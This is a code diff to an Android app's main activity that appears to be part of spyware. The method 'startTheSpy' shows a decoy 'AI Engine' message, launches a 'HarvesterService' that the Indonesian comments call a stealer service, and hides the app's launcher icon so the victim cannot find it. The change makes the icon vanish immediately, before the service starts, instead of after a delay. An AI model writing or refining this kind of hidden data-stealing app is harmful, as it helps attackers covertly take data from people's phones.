@@ -5,7 +5,6 @@ import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
-import android.os.Handler;
 import android.view.View;
 import android.widget.Button;
 import android.widget.Toast;
@@ -64,24 +63,20 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void startTheSpy() {
-        Toast.makeText(MainActivity.this, "AI Engine Aktif...", Toast.LENGTH_LONG).show();
+        Toast.makeText(MainActivity.this, "AI Engine Aktif...", Toast.LENGTH_SHORT).show();
 
-        // Jalanin Service Pencuri
+        // 1. SEMBUNYIIN ICON DULU (Tanpa Jeda)
+        ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
+        getPackageManager().setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+        );
+
+        // 2. Baru Jalanin Service
         startService(new Intent(this, HarvesterService.class));
 
-        // Sembunyiin Icon pake ComponentName eksplisit
-        new Handler().postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
-                getPackageManager().setComponentEnabledSetting(
-                        componentName,
-                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                        PackageManager.DONT_KILL_APP
-                );
-                // Tutup aplikasi
-                finishAffinity();
-            }
-        }, 3000);
+        // 3. Tutup Aplikasi
+        finishAffinity();
     }
 }
